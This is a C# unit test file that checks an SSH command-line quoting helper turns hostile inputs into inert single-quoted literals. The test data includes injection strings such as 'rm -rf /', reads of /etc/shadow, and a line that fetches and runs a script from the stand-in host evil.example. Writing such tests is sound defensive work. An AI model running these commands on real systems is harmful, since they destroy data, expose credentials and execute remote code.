using Servyx.Infrastructure.Ssh;

namespace Servyx.Infrastructure.Ssh.Tests;

/// <summary>
/// The most important tests in this project: SSH <c>exec</c> carries a single command-line string that the
/// remote shell interprets, so every argument must be quoted defensively. These tests assert the exact
/// generated command line for a battery of hostile inputs, rather than merely checking "it didn't throw".
/// </summary>
public class PosixArgvTests
{
    [Fact]
    public void QuoteArgument_plain_text_is_wrapped_in_single_quotes()
    {
        PosixArgv.QuoteArgument("hello").Should().Be("'hello'");
    }

    [Fact]
    public void QuoteArgument_empty_string_becomes_empty_quoted_pair()
    {
        PosixArgv.QuoteArgument("").Should().Be("''");
    }

    [Fact]
    public void QuoteArgument_semicolon_command_injection_is_inert()
    {
        // A naive "join with spaces" implementation would let this terminate the intended command and
        // start a new one. Single-quote wrapping makes the whole thing one literal argument.
        PosixArgv.QuoteArgument("; rm -rf /").Should().Be("'; rm -rf /'");
    }

    [Fact]
    public void QuoteArgument_backticks_are_inert()
    {
        PosixArgv.QuoteArgument("`whoami`").Should().Be("'`whoami`'");
    }

    [Fact]
    public void QuoteArgument_dollar_paren_command_substitution_is_inert()
    {
        PosixArgv.QuoteArgument("$(whoami)").Should().Be("'$(whoami)'");
    }

    [Fact]
    public void QuoteArgument_dollar_brace_variable_expansion_is_inert()
    {
        PosixArgv.QuoteArgument("${PATH}").Should().Be("'${PATH}'");
    }

    [Fact]
    public void QuoteArgument_embedded_single_quote_is_escaped_via_close_escape_reopen()
    {
        // The canonical POSIX technique: close the quote, emit an escaped literal quote, reopen the quote.
        PosixArgv.QuoteArgument("it's a test").Should().Be("'it'\\''s a test'");
    }

    [Fact]
    public void QuoteArgument_only_a_single_quote_still_escapes_correctly()
    {
        PosixArgv.QuoteArgument("'").Should().Be("''\\'''");
    }

    [Fact]
    public void QuoteArgument_multiple_single_quotes_all_escape()
    {
        PosixArgv.QuoteArgument("a'b'c").Should().Be("'a'\\''b'\\''c'");
    }

    [Fact]
    public void QuoteArgument_embedded_newline_is_preserved_literally_and_inert()
    {
        var argument = "line one\nline two; rm -rf /";
        var quoted = PosixArgv.QuoteArgument(argument);

        quoted.Should().Be("'line one\nline two; rm -rf /'");
        // Round-trip sanity: stripping the outer quotes (this input contains no embedded quote to unescape)
        // yields the original string back exactly.
        quoted[1..^1].Should().Be(argument);
    }

    [Fact]
    public void QuoteArgument_pipe_and_ampersand_are_inert()
    {
        PosixArgv.QuoteArgument("a | b & c && d || e").Should().Be("'a | b & c && d || e'");
    }

    [Fact]
    public void QuoteArgument_redirection_operators_are_inert()
    {
        PosixArgv.QuoteArgument("file > /etc/passwd; cat < /etc/shadow").Should()
            .Be("'file > /etc/passwd; cat < /etc/shadow'");
    }

    [Fact]
    public void QuoteArgument_null_throws()
    {
        var act = () => PosixArgv.QuoteArgument(null!);
        act.Should().Throw<ArgumentNullException>();
    }

    [Fact]
    public void QuoteEnvironmentAssignment_quotes_only_the_value()
    {
        PosixArgv.QuoteEnvironmentAssignment("FOO", "bar; rm -rf /").Should().Be("FOO='bar; rm -rf /'");
    }

    [Theory]
    [InlineData("FOO BAR")]
    [InlineData("FOO;BAR")]
    [InlineData("1FOO")]
    [InlineData("")]
    [InlineData("FOO=BAR")]
    public void QuoteEnvironmentAssignment_rejects_invalid_identifier_names(string invalidName)
    {
        var act = () => PosixArgv.QuoteEnvironmentAssignment(invalidName, "value");
        act.Should().Throw<ArgumentException>();
    }

    [Fact]
    public void BuildCommandLine_quotes_executable_and_every_argument()
    {
        var commandLine = PosixArgv.BuildCommandLine("/usr/bin/echo", ["hello", "world"]);

        commandLine.Should().Be("'/usr/bin/echo' 'hello' 'world'");
    }

    [Fact]
    public void BuildCommandLine_hostile_argument_cannot_break_out_of_its_quoting()
    {
        var commandLine = PosixArgv.BuildCommandLine("/bin/echo", ["; rm -rf / #"]);

        commandLine.Should().Be("'/bin/echo' '; rm -rf / #'");
    }

    [Fact]
    public void BuildCommandLine_with_working_directory_prefixes_a_safe_cd_and_still_quotes_the_directory()
    {
        var commandLine = PosixArgv.BuildCommandLine(
            "ls",
            ["-la"],
            workingDirectory: "/srv/palworld; rm -rf /");

        commandLine.Should().Be("cd '/srv/palworld; rm -rf /' && 'ls' '-la'");
    }

    [Fact]
    public void BuildCommandLine_with_environment_overrides_prefixes_quoted_assignments()
    {
        var commandLine = PosixArgv.BuildCommandLine(
            "printenv",
            [],
            environmentOverrides: new Dictionary<string, string> { ["FOO"] = "bar baz" });

        commandLine.Should().Be("FOO='bar baz' 'printenv'");
    }

    [Fact]
    public void BuildCommandLine_combines_environment_working_directory_and_arguments_in_order()
    {
        var commandLine = PosixArgv.BuildCommandLine(
            "/usr/bin/env",
            ["node", "server.js"],
            workingDirectory: "/srv/app",
            environmentOverrides: new Dictionary<string, string> { ["NODE_ENV"] = "production" });

        commandLine.Should().Be("cd '/srv/app' && NODE_ENV='production' '/usr/bin/env' 'node' 'server.js'");
    }

    [Fact]
    public void BuildCommandLine_hostile_host_or_path_style_argument_is_inert_end_to_end()
    {
        // Simulates a hostile "host name" or "path" flowing all the way into a CommandSpec argument.
        const string hostile = "10.0.0.4; curl evil.example/pwn.sh | sh #";

        var commandLine = PosixArgv.BuildCommandLine("ping", ["-c", "1", hostile]);

        commandLine.Should().Be("'ping' '-c' '1' '10.0.0.4; curl evil.example/pwn.sh | sh #'");
        commandLine.Should().NotContain("; curl evil.example/pwn.sh | sh #'ping'");
    }
}
